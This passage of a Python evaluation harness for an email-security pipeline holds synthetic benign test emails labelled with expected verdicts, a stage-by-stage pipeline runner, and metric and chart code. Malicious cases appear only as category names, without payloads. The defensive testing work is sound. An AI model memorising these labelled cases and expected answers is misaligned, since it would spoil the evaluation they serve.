                "Congratulations!\n"
                "IEEE SaTML 2025 Program Committee"
            ),
            auth_pass=True,
        ),
    })

    # --- 33. Tunisie Telecom bill ---
    cases.append({
        "name": "legit_tunisie_telecom_bill",
        "description": "Tunisie Telecom monthly phone bill notification",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="facture@tunisietelecom.tn",
            to_addr="test@test.com",
            subject="Votre facture Tunisie Telecom - Juin 2024",
            body=(
                "Tunisie Telecom\n\n"
                "Bonjour,\n\n"
                "Votre facture du mois de juin 2024 est disponible.\n\n"
                "Numero de ligne: 22 XXX XXX\n"
                "Montant: 45.750 TND\n"
                "Date limite de paiement: 15/07/2024\n\n"
                "Modes de paiement:\n"
                "- En ligne: https://www.tunisietelecom.tn/espace-client\n"
                "- Agence: presentez-vous avec votre CIN\n"
                "- Virement bancaire: RIB 07 040 0123456789 12\n\n"
                "Pour toute reclamation: 1298 (appel gratuit)\n\n"
                "Cordialement,\n"
                "Service Clientele Tunisie Telecom"
            ),
            auth_pass=True,
        ),
    })

    # --- 34. Zoom meeting invitation ---
    cases.append({
        "name": "legit_zoom_invite",
        "description": "Zoom meeting invitation from colleague",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="no-reply@zoom.us",
            to_addr="test@test.com",
            subject="Sana Meddeb has invited you to a scheduled Zoom meeting",
            body=(
                "Sana Meddeb is inviting you to a scheduled Zoom meeting.\n\n"
                "Topic: Revue trimestrielle securite SI\n"
                "Time: Jul 3, 2024 02:00 PM Tunis\n\n"
                "Join Zoom Meeting:\n"
                "https://zoom.us/j/91234567890?pwd=a1B2c3D4e5F6g7H8\n\n"
                "Meeting ID: 912 3456 7890\n"
                "Passcode: 654321\n\n"
                "One tap mobile:\n"
                "+12532158782,,91234567890#,,654321# US\n\n"
                "If you cannot join, please let the host know.\n"
                "Download Zoom: https://zoom.us/download"
            ),
            auth_pass=True,
        ),
    })

    # --- 35. DocuSign legitimate signing request ---
    cases.append({
        "name": "legit_docusign_real",
        "description": "Legitimate DocuSign envelope from known internal sender",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="dse_na4@docusign.net",
            to_addr="test@test.com",
            subject="Sana Meddeb sent you a document to review and sign",
            body=(
                "DocuSign\n\n"
                "Sana Meddeb sent you a document to review and sign.\n\n"
                "REVIEW DOCUMENT\n"
                "https://app.docusign.com/documents/details/abc123-def456\n\n"
                "Document: Convention_de_stage_2024.pdf\n\n"
                "Message from Sana Meddeb:\n"
                "\"Mohamed, merci de signer la convention de stage avant vendredi. "
                "Le document a deja ete vise par le service juridique.\"\n\n"
                "Do Not Share This Email\n"
                "This email contains a secure link to DocuSign. Please do not "
                "share this email or link with others.\n\n"
                "About DocuSign: Sign documents electronically in just minutes.\n"
                "Questions? Visit https://support.docusign.com"
            ),
            auth_pass=True,
        ),
    })

    # --- 36. OVH server monitoring alert ---
    cases.append({
        "name": "legit_ovh_monitoring",
        "description": "OVH cloud server monitoring alert (CPU spike)",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="noreply@ovh.com",
            to_addr="test@test.com",
            subject="[OVH Monitoring] Alert: CPU usage above 90% on vps-abc123",
            body=(
                "OVH Monitoring Alert\n\n"
                "Server: vps-abc123.runabove.io\n"
                "Alert: CPU usage exceeded threshold\n\n"
                "Current value: 94.2%\n"
                "Threshold: 90%\n"
                "Duration: 15 minutes\n"
                "Time: 2024-06-28 14:32:00 UTC\n\n"
                "Recommended actions:\n"
                "- Check running processes via SSH\n"
                "- Review recent deployments\n"
                "- Consider upgrading your plan if this is expected load\n\n"
                "Dashboard: https://www.ovh.com/manager/cloud/#/pci/projects\n"
                "Manage alerts: https://www.ovh.com/manager/dedicated/#/monitoring\n\n"
                "OVH SAS, 2 rue Kellermann, 59100 Roubaix, France"
            ),
            auth_pass=True,
        ),
    })

    # --- 37. Arabic newsletter from Tunisian media ---
    cases.append({
        "name": "legit_arabic_newsletter",
        "description": "Arabic newsletter from Tunisian news outlet",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="newsletter@assabah.com.tn",
            to_addr="test@test.com",
            subject="النشرة اليومية - الصباح نيوز",
            body=(
                "الصباح نيوز\n"
                "النشرة الإخبارية اليومية\n\n"
                "أبرز عناوين اليوم:\n\n"
                "١. البنك المركزي التونسي يعلن عن إجراءات جديدة لدعم الاقتصاد\n"
                "٢. افتتاح المنتدى الاقتصادي التونسي في قصر المؤتمرات\n"
                "٣. تونس تحتل المرتبة الأولى مغاربياً في مؤشر الابتكار\n\n"
                "للمزيد: https://www.assabah.com.tn\n\n"
                "لإلغاء الاشتراك: https://www.assabah.com.tn/unsubscribe\n\n"
                "الصباح نيوز - جريدة يومية مستقلة"
            ),
            auth_pass=True,
        ),
    })

    # --- 38. GitHub Actions CI notification ---
    cases.append({
        "name": "legit_github_ci",
        "description": "GitHub Actions CI workflow failure notification",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="notifications@github.com",
            to_addr="test@test.com",
            subject="[imania/email-security] Run failed: CI Pipeline - main (abc1234)",
            body=(
                "Run failed: CI Pipeline\n\n"
                "Repository: imania/email-security\n"
                "Branch: main\n"
                "Commit: abc1234 - Fix extraction timeout handling\n"
                "Author: PublisherX02\n\n"
                "Job: test (Python 3.12)\n"
                "Status: Failed\n"
                "Duration: 2m 34s\n\n"
                "Error: test_yara_scanning FAILED\n"
                "AssertionError: Expected 3 matches, got 2\n\n"
                "View workflow run:\n"
                "https://github.com/imania/email-security/actions/runs/123456789\n\n"
                "View commit:\n"
                "https://github.com/imania/email-security/commit/abc1234\n\n"
                "Unsubscribe: https://github.com/settings/notifications"
            ),
            auth_pass=True,
        ),
    })

    # --- 39. Stripe payment receipt ---
    cases.append({
        "name": "legit_stripe_receipt",
        "description": "Stripe payment receipt for SaaS subscription",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="receipts@stripe.com",
            to_addr="test@test.com",
            subject="Your receipt from DigitalOcean",
            body=(
                "Receipt from DigitalOcean\n"
                "Receipt #1234-5678\n\n"
                "Amount paid: $24.00 USD\n"
                "Date paid: June 28, 2024\n"
                "Payment method: Visa - 4521\n\n"
                "Description                     Amount\n"
                "DigitalOcean Droplet (s-2vcpu)  $18.00\n"
                "Managed Database (PostgreSQL)    $6.00\n"
                "Total                           $24.00\n\n"
                "If you have any questions, contact DigitalOcean support at "
                "https://cloud.digitalocean.com/support\n\n"
                "Stripe, 354 Oyster Point Blvd, South San Francisco, CA 94080"
            ),
            auth_pass=True,
        ),
    })

    # --- 40. Derija/French mix from colleague (realistic Tunisian email) ---
    cases.append({
        "name": "legit_derija_mix",
        "description": "Tunisian Derija/French code-switched email from colleague — tests multilingual handling",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="ahmed.gharbi@imaniabank.com.tn",
            to_addr="test@test.com",
            subject="Re: el rapport mta3 el audit",
            body=(
                "Salam Mohamed,\n\n"
                "El rapport mta3 el audit lezem yousel avant vendredi. "
                "Ena kammalt el partie technique w baatht'ha lel Karim bech yrevisiha.\n\n"
                "Tnajem t'accedi lel fichier 3al SharePoint:\n"
                "https://imaniabank.sharepoint.com/sites/audit-si/rapport-q2-2024\n\n"
                "Famma quelques points lezem nreviewouhom ensemble:\n"
                "- El config mta3 el firewall (section 3.2)\n"
                "- Les recommandations mta3 el penetration test\n"
                "- El plan de remediation\n\n"
                "Nshallah demain matin 3andi disponibilite.\n\n"
                "Tahiyyeti,\n"
                "Ahmed"
            ),
            auth_pass=True,
        ),
    })

    return cases


# ======================== PIPELINE RUNNER (NO DB) ========================

def run_pipeline_isolated(raw_eml: bytes, run_llm: bool = True) -> dict:
    """Run the full analysis pipeline on a raw email WITHOUT any DB writes.

    Returns a dict with per-stage results and the final verdict.
    """
    result = {
        "stages": {},
        "final_status": "unknown",
        "flags_total": 0,
        "deterministic_escalation": False,
    }

    # --- Parse ---
    ingestion = EmailIngestion(host="", user="", password="")
    try:
        parsed = ingestion.parse_email(raw_eml)
    except Exception as e:
        result["final_status"] = "escalated"
        result["stages"]["parse"] = {"error": str(e)}
        return result

    result["stages"]["parse"] = {
        "status": parsed.get("status"),
        "errors": parsed.get("parse_errors", []),
        "attachments": len(parsed.get("attachments", [])),
    }

    # --- Auth check (from headers, not live DKIM) ---
    auth_header = parsed.get("headers", {}).get("authentication-results") or ""
    auth_failed = any(x in auth_header.lower() for x in ["dkim=fail", "spf=fail", "dmarc=fail"])
    parsed["auth"] = {
        "summary": auth_header,
        "any_failure": auth_failed,
        "auth_header": {
            "spf": "fail" if "spf=fail" in auth_header.lower() else "pass" if "spf=pass" in auth_header.lower() else "none",
            "dkim": "fail" if "dkim=fail" in auth_header.lower() else "pass" if "dkim=pass" in auth_header.lower() else "none",
            "dmarc": "fail" if "dmarc=fail" in auth_header.lower() else "pass" if "dmarc=pass" in auth_header.lower() else "none",
        }
    }
    if auth_failed:
        parsed["status"] = "escalated"
        result["deterministic_escalation"] = True

    result["stages"]["auth"] = {"failed": auth_failed, "details": parsed["auth"]["auth_header"]}

    # --- Rules engine ---
    # Temporarily clear the blocklist cache so tests measure pure pipeline detection,
    # not accumulated analyst blocklist decisions from prior sessions.
    import rules as _rules_mod
    _saved_cache = _rules_mod._blocklist_cache
    _saved_time = _rules_mod._blocklist_cache_time
    _rules_mod._blocklist_cache = set()
    _rules_mod._blocklist_cache_time = time.time()  # prevent refresh

    engine = RuleEngine()
    pre_rules_status = parsed["status"]
    analysis = engine.analyze(parsed)

    # Restore blocklist cache
    _rules_mod._blocklist_cache = _saved_cache
    _rules_mod._blocklist_cache_time = _saved_time
    if pre_rules_status == "escalated" and analysis["verdict"] == "accepted":
        analysis["verdict"] = "escalated"
    parsed["status"] = analysis["verdict"]
    parsed["analysis"] = analysis

    rules_flags = [d for d in analysis["details"] if d["flagged"]]
    result["stages"]["rules"] = {
        "verdict": analysis["verdict"],
        "total_rules": analysis["rules_run"],
        "flags": len(rules_flags),
        "flagged_rules": [d["rule"] for d in rules_flags],
    }
    if rules_flags:
        result["deterministic_escalation"] = True

    # --- Extraction ---
    if parsed.get("attachments"):
        try:
            from extraction import extract_all_attachments
            ext_result = extract_all_attachments(parsed)
            parsed["extraction"] = ext_result

            ext_flags = ext_result.get("total_flags", 0)
            result["stages"]["extraction"] = {
                "total_flags": ext_flags,
                "escalate": ext_result.get("escalate", False),
                "results": [
                    {
                        "filename": r.get("filename"),
                        "type_mismatch": r.get("type_mismatch"),
                        "flags": r.get("flags", []),
                        "suspicious": r.get("suspicious"),
                    }
                    for r in ext_result.get("results", [])
                ],
            }
            if ext_result.get("escalate"):
                parsed["status"] = "escalated"
                result["deterministic_escalation"] = True
        except Exception as e:
            result["stages"]["extraction"] = {"error": str(e)}
    else:
        result["stages"]["extraction"] = {"skipped": True}

    # --- LLM analysis (optional) ---
    if run_llm and parsed["status"] != "escalated":
        try:
            enrichment_data = {
                "auth": parsed.get("auth", {}),
            }
            if parsed.get("extraction", {}).get("results"):
                enrichment_data["extraction"] = [
                    {"filename": r.get("filename"), "flags": r.get("flags", []),
                     "type_mismatch": r.get("type_mismatch"), "iocs": r.get("iocs", {})}
                    for r in parsed["extraction"]["results"]
                ]
            context = {
                "headers": parsed.get("headers", {}),
                "attachments": parsed.get("attachments", []),
                "enrichment": enrichment_data,
            }
            llm_res = analyze_email_body(parsed.get("body_text", ""), context=context)
            llm_verdict = (llm_res.get("verdict") or "").lower().strip()
            if llm_verdict in ("accepter", "accepted", "accept", "clean", "safe"):
                llm_verdict = "accepted"
            elif llm_verdict in ("rejeter", "escalader", "escalated", "reject"):
                llm_verdict = "escalated"
            else:
                llm_verdict = "escalated"

            if parsed["status"] != "escalated" and llm_verdict == "escalated":
                parsed["status"] = "escalated"

            result["stages"]["llm"] = {
                "verdict": llm_verdict,
                "confidence": llm_res.get("confidence"),
                "risk_score": llm_res.get("risk_score"),
                "reasons": llm_res.get("reasons", []),
            }
        except Exception as e:
            parsed["status"] = "escalated"
            result["stages"]["llm"] = {"error": str(e), "verdict": "escalated"}
    elif run_llm:
        result["stages"]["llm"] = {"skipped": "already_escalated", "verdict": "escalated"}
    else:
        result["stages"]["llm"] = {"skipped": "llm_disabled"}

    result["final_status"] = parsed["status"]
    result["flags_total"] = sum(
        1 for stage in result["stages"].values()
        if isinstance(stage, dict) and stage.get("flags")
    )

    return result


# ======================== LIVE EMAIL LOADER ========================

def load_live_emails(limit: int = 15) -> list[dict]:
    """Fetch recent emails from IMAP as benign test cases."""
    cases = []
    try:
        ingestion = EmailIngestion(
            host=os.getenv("IMAP_HOST"),
            user=os.getenv("IMAP_USER"),
            password=os.getenv("IMAP_PASSWORD"),
        )
        ingestion.connect()
        raw_emails = ingestion.fetch_recent(since_days=7, limit=limit)
        ingestion.disconnect()

        for i, raw in enumerate(raw_emails):
            msg = BytesParser(policy=policy.default).parsebytes(raw)
            sender = msg.get("From", "unknown")
            subject = msg.get("Subject", "no subject")
            cases.append({
                "name": f"live_email_{i+1}",
                "description": f"Live inbox: {sender[:40]} — {subject[:50]}",
                "expected": "benign",
                "eml": raw,
            })
    except Exception as e:
        print(f"[LIVE] Failed to fetch live emails: {e}")
    return cases


# ======================== METRICS & VISUALIZATION ========================

def classify_result(result: dict) -> str:
    """Map pipeline result to binary classification."""
    status = result.get("final_status", "")
    if status in ("escalated", "quarantined", "blocked", "proposed_reject"):
        return "malicious"
    elif status in ("accepted", "recu"):
        return "benign"
    return "malicious"  # fail-safe: unknown = treat as malicious


def compute_metrics(y_true: list[str], y_pred: list[str]) -> dict:
    """Compute all classification metrics."""
    labels = ["benign", "malicious"]
    return {
        "accuracy": accuracy_score(y_true, y_pred),
        "precision": precision_score(y_true, y_pred, pos_label="malicious", zero_division=0),
        "recall": recall_score(y_true, y_pred, pos_label="malicious", zero_division=0),
        "f1": f1_score(y_true, y_pred, pos_label="malicious", zero_division=0),
        "confusion_matrix": confusion_matrix(y_true, y_pred, labels=labels).tolist(),
        "classification_report": classification_report(y_true, y_pred, labels=labels, zero_division=0),
    }


def plot_confusion_matrix(cm: list, output_path: Path):
    """Heatmap of the confusion matrix."""
    fig, ax = plt.subplots(figsize=(7, 6))
    labels = ["Benign", "Malicious"]
    cm_arr = np.array(cm)
    sns.heatmap(
        cm_arr, annot=True, fmt="d", cmap="RdYlGn_r",
        xticklabels=labels, yticklabels=labels,
        linewidths=1, linecolor="#333",
        annot_kws={"fontsize": 18, "fontweight": "bold"},
        ax=ax,
    )
    ax.set_xlabel("Predicted", fontsize=13, fontweight="bold")
    ax.set_ylabel("Actual", fontsize=13, fontweight="bold")
    ax.set_title("Pipeline Confusion Matrix", fontsize=15, fontweight="bold", pad=12)

    # Annotate quadrants
    total = cm_arr.sum()
    annotations = [
        (0, 0, "TN", "#2ecc71"), (0, 1, "FP", "#e67e22"),
        (1, 0, "FN", "#e74c3c"), (1, 1, "TP", "#2ecc71"),
    ]
    for row, col, label, color in annotations:
        pct = cm_arr[row, col] / total * 100 if total else 0
        ax.text(col + 0.5, row + 0.78, f"{label} ({pct:.0f}%)",
                ha="center", va="center", fontsize=10, color=color, fontweight="bold")

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Confusion matrix -> {output_path}")


def plot_metrics_bar(metrics: dict, output_path: Path):
    """Bar chart of precision, recall, F1, accuracy."""
    fig, ax = plt.subplots(figsize=(8, 5))
    names = ["Accuracy", "Precision\n(malicious)", "Recall\n(malicious)", "F1 Score"]
    values = [metrics["accuracy"], metrics["precision"], metrics["recall"], metrics["f1"]]
    colors = ["#3498db", "#e67e22", "#e74c3c", "#2ecc71"]

    bars = ax.bar(names, values, color=colors, width=0.6, edgecolor="#222", linewidth=1.2)
    for bar, val in zip(bars, values):
        ax.text(bar.get_x() + bar.get_width() / 2, bar.get_height() + 0.02,
                f"{val:.1%}", ha="center", va="bottom", fontsize=13, fontweight="bold")

    ax.set_ylim(0, 1.15)
    ax.set_ylabel("Score", fontsize=12)
    ax.set_title("Pipeline Detection Metrics", fontsize=15, fontweight="bold", pad=12)
    ax.axhline(y=1.0, color="#555", linestyle="--", linewidth=0.8, alpha=0.5)
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Metrics bar chart -> {output_path}")


def plot_stage_detection(results: list[dict], output_path: Path):
    """Heatmap showing which stage caught each malicious email."""
    malicious = [r for r in results if r["case"]["expected"] == "malicious"]
    if not malicious:
        return

    stages = ["auth", "rules", "extraction", "llm"]
    names = [r["case"]["name"] for r in malicious]
    matrix = []

    for r in malicious:
        row = []
        s = r["result"]["stages"]
        # Auth
        row.append(1 if s.get("auth", {}).get("failed") else 0)
        # Rules
        row.append(1 if s.get("rules", {}).get("flags", 0) > 0 else 0)
        # Extraction
        ext = s.get("extraction", {})
        row.append(1 if ext.get("total_flags", 0) > 0 or ext.get("escalate") else 0)
        # LLM
        llm = s.get("llm", {})
        row.append(1 if llm.get("verdict") == "escalated" else 0)
        matrix.append(row)

    fig, ax = plt.subplots(figsize=(9, max(5, len(names) * 0.5 + 2)))
    mat = np.array(matrix)
    sns.heatmap(
        mat, annot=True, fmt="d", cmap="YlOrRd",
        xticklabels=[s.upper() for s in stages],
        yticklabels=[n.replace("_", " ") for n in names],
        linewidths=1, linecolor="#333",
        cbar_kws={"label": "Detected (1=yes)"},
        ax=ax,
    )
    ax.set_title("Detection Stage Heatmap (Malicious Emails)", fontsize=14, fontweight="bold", pad=12)
    ax.set_xlabel("Pipeline Stage", fontsize=11)
    ax.set_ylabel("Test Case", fontsize=11)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Stage detection heatmap -> {output_path}")


def plot_per_case_detail(results: list[dict], output_path: Path):
    """Horizontal bar chart showing per-case verdict with expected vs predicted."""
    fig, ax = plt.subplots(figsize=(12, max(5, len(results) * 0.4 + 2)))

    names = []
    colors = []
    for r in results:
        name = r["case"]["name"].replace("_", " ")
        expected = r["case"]["expected"]
        predicted = classify_result(r["result"])
        correct = expected == predicted

        names.append(name)
        if correct and expected == "malicious":
            colors.append("#e74c3c")   # TP — red (correctly caught)
        elif correct and expected == "benign":
            colors.append("#2ecc71")   # TN — green (correctly passed)
        elif not correct and expected == "malicious":
            colors.append("#f39c12")   # FN — orange (MISSED — worst case)
        else:
            colors.append("#e67e22")   # FP — amber (false alarm)

    y_pos = np.arange(len(names))
    bars = ax.barh(y_pos, [1] * len(names), color=colors, edgecolor="#222", linewidth=0.8)
    ax.set_yticks(y_pos)
    ax.set_yticklabels(names, fontsize=9)
    ax.set_xlim(0, 1.5)
    ax.set_xticks([])

    for i, r in enumerate(results):
        expected = r["case"]["expected"]
        predicted = classify_result(r["result"])
        status = r["result"]["final_status"]
        label = f"Expected: {expected} | Got: {predicted} ({status})"
        match = "OK" if expected == predicted else "MISS" if expected == "malicious" else "FP"
        ax.text(1.02, i, f"[{match}] {label}", va="center", fontsize=8.5, fontfamily="monospace")

    # Legend
    from matplotlib.patches import Patch
    legend_items = [
        Patch(facecolor="#e74c3c", label="TP (malicious caught)"),
        Patch(facecolor="#2ecc71", label="TN (benign passed)"),
        Patch(facecolor="#f39c12", label="FN (malicious MISSED)"),
        Patch(facecolor="#e67e22", label="FP (benign flagged)"),
    ]
    ax.legend(handles=legend_items, loc="lower right", fontsize=9)

    ax.set_title("Per-Case Verdict Results", fontsize=14, fontweight="bold", pad=12)
    ax.invert_yaxis()
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)
    ax.spines["bottom"].set_visible(False)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Per-case detail chart -> {output_path}")


def plot_radar(metrics: dict, output_path: Path):
    """Radar / spider chart of multi-dimensional pipeline performance."""
    from matplotlib.patches import FancyBboxPatch

    labels = ["Accuracy", "Precision", "Recall", "F1", "Specificity"]
    cm = np.array(metrics["confusion_matrix"])
    tn, fp, fn, tp = cm[0][0], cm[0][1], cm[1][0], cm[1][1]
    specificity = tn / (tn + fp) if (tn + fp) > 0 else 0
    values = [metrics["accuracy"], metrics["precision"], metrics["recall"], metrics["f1"], specificity]

    angles = np.linspace(0, 2 * np.pi, len(labels), endpoint=False).tolist()
    values_plot = values + [values[0]]
    angles += [angles[0]]

    fig, ax = plt.subplots(figsize=(7, 7), subplot_kw=dict(polar=True))
    ax.fill(angles, values_plot, color="#6366f1", alpha=0.20)
    ax.plot(angles, values_plot, color="#6366f1", linewidth=2.5, marker="o", markersize=8)

    # Value labels on each vertex
    for angle, val, label in zip(angles[:-1], values, labels):
        ha = "left" if 0 < angle < np.pi else "right" if np.pi < angle < 2 * np.pi else "center"
        ax.text(angle, val + 0.07, f"{val:.0%}", ha=ha, va="center",
                fontsize=12, fontweight="bold", color="#222")

    ax.set_thetagrids(np.degrees(angles[:-1]), labels, fontsize=11, fontweight="600")
    ax.set_ylim(0, 1.15)
    ax.set_yticks([0.25, 0.50, 0.75, 1.00])
    ax.set_yticklabels(["25%", "50%", "75%", "100%"], fontsize=8, color="#888")
    ax.set_title("Pipeline Performance Radar", fontsize=15, fontweight="bold", pad=24)
    ax.grid(color="#ccc", linewidth=0.6)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Radar chart -> {output_path}")


def plot_verdict_pie(y_true: list[str], y_pred: list[str], output_path: Path):
    """Donut chart showing TP / TN / FP / FN distribution."""
    cm = confusion_matrix(y_true, y_pred, labels=["benign", "malicious"])
    tn, fp, fn, tp = cm[0][0], cm[0][1], cm[1][0], cm[1][1]

    sizes = [tp, tn, fp, fn]
    labels_list = [
        f"TP: {tp}\n(malicious caught)",
        f"TN: {tn}\n(benign passed)",
        f"FP: {fp}\n(false alarm)",
        f"FN: {fn}\n(MISSED)",
    ]
    colors = ["#e74c3c", "#2ecc71", "#e67e22", "#f39c12"]
    explode = (0.03, 0.03, 0.06, 0.10)

    fig, ax = plt.subplots(figsize=(7, 7))
    wedges, texts, autotexts = ax.pie(
        sizes, labels=labels_list, colors=colors, explode=explode,
        autopct=lambda p: f"{p:.0f}%" if p > 0 else "",
        startangle=90, pctdistance=0.78,
        wedgeprops=dict(width=0.45, edgecolor="#222", linewidth=1.2),
        textprops=dict(fontsize=10),
    )
    for at in autotexts:
        at.set_fontsize(13)
        at.set_fontweight("bold")
        at.set_color("white")

    ax.set_title("Verdict Distribution", fontsize=15, fontweight="bold", pad=16)
    # Center label
    ax.text(0, 0, f"{sum(sizes)}\ntotal", ha="center", va="center",
            fontsize=18, fontweight="bold", color="#333")

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Verdict pie chart -> {output_path}")


def plot_attack_vector_coverage(results: list[dict], output_path: Path):
    """Grouped bar chart: which pipeline stage detected each attack vector category."""
    malicious = [r for r in results if r["case"]["expected"] == "malicious"]
    if not malicious:
        return

    # Categorise attack types
    categories = {
        "Macro / OLE": ["OLE_VBA_macro_doc"],
        "PDF exploit": ["PDF_javascript_launch"],
        "Type mismatch": ["PE_as_PDF_type_mismatch", "double_extension_screensaver"],
        "Encrypted + pwd": ["encrypted_zip_password_in_body"],
        "Template inject": ["OOXML_remote_template"],
        "HTML smuggling": ["HTML_smuggling"],
        "SVG / script": ["SVG_embedded_script"],
        "Container / LNK": ["ISO_with_LNK_payload"],
        "Polyglot": ["polyglot_PDF_JAR"],
        "Social eng.": ["spear_phish_credential_harvest", "CEO_wire_fraud"],
    }

    stage_names = ["Auth", "Rules", "Extraction", "LLM"]
    cat_labels = []
    stage_data = {s: [] for s in stage_names}

    for cat, case_names in categories.items():
        cat_results = [r for r in malicious if r["case"]["name"] in case_names]
        if not cat_results:
            continue
        cat_labels.append(cat)
        for si, skey in enumerate(["auth", "rules", "extraction", "llm"]):
            detected = 0
            for r in cat_results:
                s = r["result"]["stages"].get(skey, {})
                if skey == "auth" and s.get("failed"):
                    detected = 1
                elif skey == "rules" and s.get("flags", 0) > 0:
                    detected = 1
                elif skey == "extraction" and (s.get("total_flags", 0) > 0 or s.get("escalate")):
                    detected = 1
                elif skey == "llm" and s.get("verdict") == "escalated":
                    detected = 1
            stage_data[stage_names[si]].append(detected)

    x = np.arange(len(cat_labels))
    width = 0.20
    stage_colors = {"Auth": "#9b59b6", "Rules": "#3498db", "Extraction": "#e74c3c", "LLM": "#f39c12"}

    fig, ax = plt.subplots(figsize=(14, 6))
    for i, stage in enumerate(stage_names):
        offset = (i - 1.5) * width
        bars = ax.bar(x + offset, stage_data[stage], width, label=stage,
                      color=stage_colors[stage], edgecolor="#222", linewidth=0.8, alpha=0.85)

    ax.set_xticks(x)
    ax.set_xticklabels(cat_labels, fontsize=10, rotation=25, ha="right")
    ax.set_yticks([0, 1])
    ax.set_yticklabels(["Not detected", "Detected"], fontsize=10)
    ax.set_title("Attack Vector Detection by Pipeline Stage", fontsize=15, fontweight="bold", pad=12)
    ax.legend(fontsize=10, loc="upper right")
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Attack vector coverage -> {output_path}")


def plot_latency(results: list[dict], output_path: Path):
    """Box + strip plot of per-case processing latency, split by class."""
    mal_times = [r["elapsed"] for r in results if r["case"]["expected"] == "malicious"]
    ben_times = [r["elapsed"] for r in results if r["case"]["expected"] == "benign"]

    fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(12, 5), gridspec_kw={"width_ratios": [1, 2]})

    # Box plot
    bp = ax1.boxplot([ben_times, mal_times], labels=["Benign", "Malicious"],
                     patch_artist=True, widths=0.5,
                     boxprops=dict(linewidth=1.2),
                     medianprops=dict(color="#222", linewidth=2))
    bp["boxes"][0].set_facecolor("#2ecc71")
    bp["boxes"][0].set_alpha(0.5)
    bp["boxes"][1].set_facecolor("#e74c3c")
    bp["boxes"][1].set_alpha(0.5)
    ax1.set_ylabel("Seconds", fontsize=11)
    ax1.set_title("Latency Distribution", fontsize=13, fontweight="bold")
    ax1.spines["top"].set_visible(False)
    ax1.spines["right"].set_visible(False)

    # Per-case horizontal bar
    names = [r["case"]["name"].replace("_", " ")[:25] for r in results]
    times = [r["elapsed"] for r in results]
    colors = ["#e74c3c" if r["case"]["expected"] == "malicious" else "#2ecc71" for r in results]
    y_pos = np.arange(len(names))
    ax2.barh(y_pos, times, color=colors, edgecolor="#222", linewidth=0.6, height=0.7)
    ax2.set_yticks(y_pos)
    ax2.set_yticklabels(names, fontsize=8)
    ax2.set_xlabel("Seconds", fontsize=11)
    ax2.set_title("Per-Case Processing Time", fontsize=13, fontweight="bold")
    ax2.invert_yaxis()
    ax2.spines["top"].set_visible(False)
    ax2.spines["right"].set_visible(False)

    # Annotate times
    for i, t in enumerate(times):
        ax2.text(t + 0.02, i, f"{t:.2f}s", va="center", fontsize=8, color="#555")

    from matplotlib.patches import Patch
    ax2.legend(handles=[Patch(facecolor="#e74c3c", label="Malicious"),
                        Patch(facecolor="#2ecc71", label="Benign")],
               loc="lower right", fontsize=9)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Latency chart -> {output_path}")


def plot_history_trend(output_path: Path):
    """Line chart showing metrics over time from past accuracy runs.

    Reads all results_*.json files in the output directory and plots
    accuracy/precision/recall/F1 progression.
    """
    json_files = sorted(_OUT_DIR.glob("results_*.json"))
    if len(json_files) < 2:
        print("  [PLOT] Trend chart skipped — need at least 2 historical runs")
        return

    runs = []
    for jf in json_files:
        try:
            data = json.loads(jf.read_text(encoding="utf-8"))
            m = data.get("metrics", {})
            ts = data.get("timestamp", "")
            if m and ts:
                runs.append({
                    "timestamp": ts,
                    "accuracy": m.get("accuracy", 0),
                    "precision": m.get("precision", 0),
                    "recall": m.get("recall", 0),
                    "f1": m.get("f1", 0),
                })
        except Exception:
            continue

    if len(runs) < 2:
        print("  [PLOT] Trend chart skipped — need at least 2 valid runs")
        return

    fig, ax = plt.subplots(figsize=(10, 5))
    x_labels = [r["timestamp"][:8] for r in runs]  # YYYYMMDD
    x = np.arange(len(runs))

    metric_styles = [
        ("accuracy", "Accuracy", "#3498db", "o"),
        ("precision", "Precision", "#e67e22", "s"),
        ("recall", "Recall", "#e74c3c", "^"),
        ("f1", "F1 Score", "#2ecc71", "D"),
    ]

    for key, label, color, marker in metric_styles:
        vals = [r[key] for r in runs]
        ax.plot(x, vals, label=label, color=color, marker=marker, markersize=8,
                linewidth=2, markeredgecolor="#222", markeredgewidth=1)

    ax.set_xticks(x)
    ax.set_xticklabels(x_labels, rotation=45, ha="right", fontsize=9)
    ax.set_ylim(0, 1.08)
    ax.set_ylabel("Score", fontsize=12)
    ax.set_xlabel("Run Date", fontsize=12)
    ax.set_title("Pipeline Accuracy Over Time", fontsize=15, fontweight="bold", pad=12)
    ax.legend(fontsize=10, loc="lower right")
    ax.axhline(y=1.0, color="#555", linestyle="--", linewidth=0.8, alpha=0.4)
    ax.grid(axis="y", alpha=0.3)
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Historical trend -> {output_path}")


# ======================== MAIN ========================

def main():
    parser = argparse.ArgumentParser(description="Pipeline accuracy measurement")
    parser.add_argument("--live", action="store_true", help="Include live IMAP emails as benign set")
    parser.add_argument("--no-llm", action="store_true", help="Skip LLM analysis (faster)")
